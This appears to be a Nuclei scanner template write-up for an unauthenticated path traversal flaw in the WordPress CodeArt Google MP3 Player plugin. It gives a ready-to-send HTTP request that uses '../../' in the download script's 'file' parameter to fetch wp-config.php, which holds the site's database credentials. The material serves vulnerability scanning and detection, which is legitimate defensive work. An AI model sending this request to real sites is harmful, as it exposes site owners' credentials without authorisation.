# Nuclei Template: WordPress Plugin CodeArt Google MP3 Player - File Disclosure Download
**Template ID:** wp-googlemp3-lfi
**Vulnerability Class:** Path Traversal
**Severity:** Critical
**Source:** Nuclei Template (`wp-googlemp3-lfi.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Plugin CodeArt Google MP3 Player allows an unauthenticated attacker to download file from server.

## Steps to reproduce / Exploit Payload
```http
GET /wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../wp-config.php HTTP/1.1
Host: {{Hostname}}
```

## References
- https://www.exploit-db.com/exploits/35460
- https://wordpress.org/plugins/google-mp3-audio-player/
